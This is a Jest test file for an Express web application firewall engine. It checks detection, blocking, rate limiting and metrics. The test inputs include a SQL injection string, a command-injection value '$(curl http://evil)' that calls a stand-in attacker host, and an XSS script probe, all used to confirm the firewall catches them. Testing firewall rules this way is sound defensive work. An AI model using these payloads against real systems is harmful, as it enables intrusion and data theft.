import { Request } from 'express';
import { WafEngine } from '../../src/waf/engine';
import { normalizeWafOptions } from '../../src/waf/config';

function makeRequest(overrides: Partial<Request> = {}): Request {
  return {
    method: 'GET',
    url: '/api/users',
    originalUrl: '/api/users',
    headers: {},
    query: {},
    params: {},
    body: {},
    socket: { remoteAddress: '127.0.0.1' },
    ...overrides
  } as Request;
}

describe('WafEngine', () => {
  it('detect mode logs suspicious request but allows it', () => {
    const engine = new WafEngine(
      normalizeWafOptions({
        enabled: true,
        mode: 'detect'
      })
    );

    const req = makeRequest({
      query: { search: "' OR 1=1 --" }
    });
    const decision = engine.evaluate(req);

    expect(decision.allowed).toBe(true);
    expect(decision.action).toBe('log');
    expect(decision.score).toBeGreaterThan(0);
    expect(decision.matches.length).toBeGreaterThan(0);
  });

  it('soft-block mode blocks high-risk requests', () => {
    const engine = new WafEngine(
      normalizeWafOptions({
        enabled: true,
        mode: 'soft-block'
      })
    );

    const req = makeRequest({
      body: {
        cmd: '$(curl http://evil)'
      }
    });
    const decision = engine.evaluate(req);

    expect(decision.allowed).toBe(false);
    expect(decision.action).toBe('soft-block');
    expect(decision.statusCode).toBe(403);
  });

  it('rate limit triggers soft-block and retry metadata', () => {
    const engine = new WafEngine(
      normalizeWafOptions({
        enabled: true,
        mode: 'soft-block',
        rateLimit: {
          enabled: true,
          windowMs: 60_000,
          maxRequests: 1,
          blockDurationMs: 30_000
        }
      })
    );

    const req = makeRequest();
    const first = engine.evaluate(req);
    const second = engine.evaluate(req);

    expect(first.allowed).toBe(true);
    expect(second.allowed).toBe(false);
    expect(second.blockedByRateLimit).toBe(true);
    expect(second.retryAfterMs).toBeGreaterThan(0);
  });

  it('provides metrics snapshot', () => {
    const engine = new WafEngine(
      normalizeWafOptions({
        enabled: true,
        mode: 'detect'
      })
    );

    engine.evaluate(makeRequest());
    engine.evaluate(makeRequest({ query: { q: '<script>alert(1)</script>' } }));
    const metrics = engine.getMetrics();

    expect(metrics.totalRequests).toBe(2);
    expect(metrics.totalEvaluated).toBe(2);
    expect(metrics.totalRuleMatches).toBeGreaterThan(0);
    expect(metrics.averageEvaluationMs).toBeGreaterThanOrEqual(0);
  });
});
